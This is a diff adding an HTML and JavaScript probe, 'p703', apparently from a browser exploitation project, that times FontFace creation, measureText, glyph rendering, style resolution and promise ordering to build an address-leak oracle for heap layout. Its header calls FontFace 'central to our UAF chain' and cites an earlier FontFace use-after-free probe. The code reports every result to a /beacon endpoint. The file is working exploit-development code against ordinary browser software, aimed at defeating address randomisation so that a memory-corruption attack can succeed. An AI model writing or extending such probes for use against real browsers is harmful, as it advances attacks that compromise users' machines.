@@ -1,0 +1,325 @@
+<!--
+  p703: CSS font subsystem timing oracle for address leak
+
+  The FontFace API and CSS @font-face are central to our UAF chain.
+  This probe explores whether the font subsystem itself can be used
+  as an address oracle:
+
+  A) Font loading timing -- different font formats (woff2 vs truetype)
+     take different time to parse. The parser allocates internal
+     buffers; if we can measure parse time precisely, it reveals
+     allocator state.
+  B) Unicode-range matching timing -- the engine checks if a requested
+     codepoint falls within the font's unicode-range. Checking many
+     ranges vs few ranges takes different time.
+  C) FontFace status transitions as allocation oracle -- creating
+     many FontFace objects fills specific bmalloc size classes.
+     The allocation pattern (timing of .loaded promise resolution)
+     reveals heap layout.
+  D) Canvas measureText as JIT oracle -- measureText() may be
+     JIT-optimized for hot font paths. The timing reveals whether
+     the code path is JIT-compiled.
+  E) Font data URL parsing -- data: URLs with font content force
+     synchronous decode. The decode timing varies with content.
+  F) CSS animation timing with font-dependent layout -- triggering
+     layout recalculation with font-dependent elements and measuring
+     the animation frame time.
+
+  CRASH_CLASS: LOW (timing observation, font loading)
+  prior art: p612 (FontFace T-determinism), p580 (FontFace UAF)
+-->
+<!DOCTYPE html><html><head><meta charset="utf-8"><title>p703</title>
+<style>
+@font-face {
+  font-family: 'TestFont';
+  src: local('sans-serif');
+  unicode-range: U+0041-005A;
+}
+</style>
+<script>
+function b(m){try{var x=new XMLHttpRequest();x.open('GET','/beacon/'+encodeURIComponent(m),false);x.send();}catch(e){}}
+
+function main(){
+  b('P703-START:CSS-FONT-TIMING-ORACLE');
+  var results = [];
+
+  // === SECTION A: FontFace creation timing as allocator oracle ===
+  b('A:FONTFACE-ALLOC-TIMING');
+  try {
+    // Create FontFace objects in batches and measure allocation timing
+    // Each FontFace allocates ~192B from bmalloc (our UAF target size)
+    var batchTimes = [];
+
+    for (var batch = 0; batch < 20; batch++) {
+      var faces = [];
+      var t0 = performance.now();
+      for (var i = 0; i < 100; i++) {
+        var face = new FontFace('test' + (batch*100+i),
+          'local(sans-serif)',
+          {unicodeRange: 'U+' + (0x100 + batch*100+i).toString(16)});
+        faces.push(face);
+      }
+      var dt = performance.now() - t0;
+      batchTimes.push(dt.toFixed(3));
+    }
+    b('A:BATCH-TIMES:' + batchTimes.join(','));
+
+    // Look for steps (page boundary crossings in bmalloc)
+    var steps = [];
+    for (var i = 1; i < batchTimes.length; i++) {
+      var ratio = parseFloat(batchTimes[i]) / parseFloat(batchTimes[i-1]);
+      if (ratio > 1.5) steps.push(i + ':' + ratio.toFixed(2));
+    }
+    if (steps.length > 0) {
+      b('A:ALLOC-STEPS:' + steps.join(','));
+      results.push('A:alloc-step');
+    }
+  } catch(e) {
+    b('A:ERR:' + e.message);
+  }
+
+  // === SECTION B: measureText timing variance ===
+  b('B:MEASURETEXT-TIMING');
+  try {
+    var canvas = document.createElement('canvas');
+    var ctx = canvas.getContext('2d');
+
+    // Warm up measureText
+    for (var i = 0; i < 1000; i++) ctx.measureText('test');
+
+    // Measure timing for different string lengths
+    var measureTimes = [];
+    var testStrings = ['A', 'Hello', 'A'.repeat(100), 'A'.repeat(1000),
+      String.fromCharCode(0x4E00), // CJK character
+      String.fromCharCode(0x0041, 0x0301), // combining character
+      '😀' // emoji
+    ];
+
+    for (var s = 0; s < testStrings.length; s++) {
+      var t0 = performance.now();
+      for (var i = 0; i < 10000; i++) ctx.measureText(testStrings[s]);
+      var dt = performance.now() - t0;
+      measureTimes.push(testStrings[s].length + 'ch:' + dt.toFixed(2));
+    }
+    b('B:MEASURE-TIMES:' + measureTimes.join(','));
+
+    // Check if font-specific path is slower (reveals font loading state)
+    ctx.font = "20px 'TestFont', sans-serif";
+    var t0 = performance.now();
+    for (var i = 0; i < 10000; i++) ctx.measureText('ABCDEFGHIJ');
+    var customDt = performance.now() - t0;
+
+    ctx.font = '20px sans-serif';
+    var t1 = performance.now();
+    for (var i = 0; i < 10000; i++) ctx.measureText('ABCDEFGHIJ');
+    var defaultDt = performance.now() - t1;
+
+    b('B:CUSTOM-FONT=' + customDt.toFixed(2) + ',DEFAULT=' + defaultDt.toFixed(2));
+    if (customDt / defaultDt > 1.5) {
+      results.push('B:font-timing-diff');
+    }
+  } catch(e) {
+    b('B:ERR:' + e.message);
+  }
+
+  // === SECTION C: FontFace loaded promise resolution order ===
+  // When multiple FontFaces resolve their .loaded promises,
+  // the resolution order might depend on internal queue addresses
+  b('C:FONTFACE-RESOLVE-ORDER');
+  try {
+    var resolveOrder = [];
+    var faces = [];
+
+    for (var i = 0; i < 10; i++) {
+      var face = new FontFace('order' + i, 'local(sans-serif)');
+      face._idx = i;
+      faces.push(face);
+    }
+
+    // Add all to document and track resolve order
+    var promises = faces.map(function(face, idx) {
+      return face.load().then(function() {
+        resolveOrder.push(idx);
+      }).catch(function() {
+        resolveOrder.push('ERR' + idx);
+      });
+    });
+
+    // Wait synchronously (best effort)
+    var deadline = Date.now() + 2000;
+    while (resolveOrder.length < 10 && Date.now() < deadline) {
+      // Pump microtask queue via sync XHR
+      try {
+        var x = new XMLHttpRequest();
+        x.open('GET', '/pump/' + resolveOrder.length, false);
+        x.send();
+      } catch(e) {}
+    }
+
+    b('C:RESOLVE-ORDER:' + resolveOrder.join(','));
+    b('C:RESOLVED=' + resolveOrder.length + '/10');
+
+    // Check if order matches creation order (sequential = no address dependency)
+    var sequential = true;
+    for (var i = 1; i < resolveOrder.length; i++) {
+      if (resolveOrder[i] < resolveOrder[i-1]) {
+        sequential = false;
+        break;
+      }
+    }
+    b('C:SEQUENTIAL=' + sequential);
+    if (!sequential) {
+      results.push('C:non-sequential-resolve');
+    }
+  } catch(e) {
+    b('C:ERR:' + e.message);
+  }
+
+  // === SECTION D: Canvas font rendering as cache oracle ===
+  // Rendering text forces font glyph caching. The cache is
+  // address-dependent (hash table). By measuring rendering time
+  // for different character sequences, we can probe cache behavior.
+  b('D:GLYPH-CACHE-ORACLE');
+  try {
+    var canvas = document.createElement('canvas');
+    canvas.width = 400;
+    canvas.height = 100;
+    var ctx = canvas.getContext('2d');
+    ctx.font = '16px monospace';
+
+    // Prime the glyph cache with ASCII
+    for (var i = 0; i < 100; i++) {
+      ctx.fillText('ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789', 0, 50);
+    }
+
+    // Measure cached vs uncached glyph rendering
+    var cachedTime, uncachedTime;
+
+    // Cached: same chars we just rendered
+    var t0 = performance.now();
+    for (var i = 0; i < 5000; i++) {
+      ctx.fillText('HELLO WORLD', 0, 50);
+    }
+    cachedTime = performance.now() - t0;
+
+    // Uncached: rare Unicode chars (if available)
+    var rareStr = '';
+    for (var cp = 0x2600; cp < 0x2620; cp++) {
+      rareStr += String.fromCharCode(cp);
+    }
+    var t1 = performance.now();
+    for (var i = 0; i < 5000; i++) {
+      ctx.fillText(rareStr, 0, 50);
+    }
+    uncachedTime = performance.now() - t1;
+
+    b('D:CACHED=' + cachedTime.toFixed(2) + ',UNCACHED=' + uncachedTime.toFixed(2));
+    b('D:RATIO=' + (uncachedTime/cachedTime).toFixed(2));
+  } catch(e) {
+    b('D:ERR:' + e.message);
+  }
+
+  // === SECTION E: CSS computed style timing with fonts ===
+  // getComputedStyle forces style resolution which involves
+  // font matching. The timing of style resolution can vary
+  // based on internal font cache state.
+  b('E:COMPUTED-STYLE-TIMING');
+  try {
+    // Create elements with different font stacks
+    var container = document.createElement('div');
+    container.style.cssText = 'position:absolute;left:-9999px;';
+    document.body.appendChild(container);
+
+    var elements = [];
+    var fontStacks = [
+      'serif', 'sans-serif', 'monospace',
+      "'TestFont', sans-serif",
+      "'NonExistent1', 'NonExistent2', 'NonExistent3', sans-serif",
+      "20px/1.5 'TestFont', Georgia, 'Times New Roman', serif"
+    ];
+
+    for (var i = 0; i < fontStacks.length; i++) {
+      var el = document.createElement('span');
+      el.textContent = 'Test text for font measurement';
+      el.style.font = fontStacks[i];
+      container.appendChild(el);
+      elements.push(el);
+    }
+
+    // Measure getComputedStyle timing for each
+    var styleTimes = [];
+    for (var i = 0; i < elements.length; i++) {
+      var t0 = performance.now();
+      for (var j = 0; j < 5000; j++) {
+        var cs = getComputedStyle(elements[i]);
+        var ff = cs.fontFamily;
+        var fs = cs.fontSize;
+      }
+      var dt = performance.now() - t0;
+      styleTimes.push(fontStacks[i].substring(0, 20) + ':' + dt.toFixed(2));
+    }
+    b('E:STYLE-TIMES:' + styleTimes.join(','));
+
+    document.body.removeChild(container);
+  } catch(e) {
+    b('E:ERR:' + e.message);
+  }
+
+  // === SECTION F: FontFace descriptor enumeration ===
+  // Check what properties FontFace exposes -- some may be
+  // non-standard or reveal internal state
+  b('F:FONTFACE-DESCRIPTORS');
+  try {
+    var face = new FontFace('probe', 'local(sans-serif)');
+    var props = [];
+    for (var k in face) {
+      props.push(k + ':' + typeof face[k]);
+    }
+    b('F:PROPS:' + props.join(','));
+
+    // Check prototype chain for non-standard methods
+    var proto = Object.getPrototypeOf(face);
+    var protoProps = Object.getOwnPropertyNames(proto);
+    b('F:PROTO-PROPS:' + protoProps.join(','));
+
+    // Check if any property returns an unexpected type
+    var unexpected = [];
+    for (var i = 0; i < protoProps.length; i++) {
+      try {
+        var v = face[protoProps[i]];
+        if (typeof v === 'number' && v > 0x10000) {
+          unexpected.push(protoProps[i] + '=' + v);
+        }
+      } catch(e2) {}
+    }
+    if (unexpected.length > 0) {
+      b('F:UNEXPECTED:' + unexpected.join(','));
+      results.push('F:fontface-leak');
+    }
+
+    // Check loaded promise's internal state
+    var loaded = face.loaded;
+    b('F:LOADED-TYPE:' + typeof loaded);
+    b('F:STATUS:' + face.status);
+
+    // Enumerate all own properties of the promise
+    if (loaded) {
+      var promiseProps = Object.getOwnPropertyNames(loaded);
+      b('F:PROMISE-PROPS:' + promiseProps.join(','));
+    }
+  } catch(e) {
+    b('F:ERR:' + e.message);
+  }
+
+  // === RESULTS ===
+  if (results.length > 0) {
+    b('P703-RESULT:HITS=' + results.join(';'));
+  } else {
+    b('P703-RESULT:NO-LEAK-DETECTED');
+  }
+  b('P703-DONE');
+}
+
+setTimeout(main, 200);
+</script>
+</head><body style="margin:0"><pre id="log">p703: CSS font subsystem timing oracle for address leak</pre></body></html>
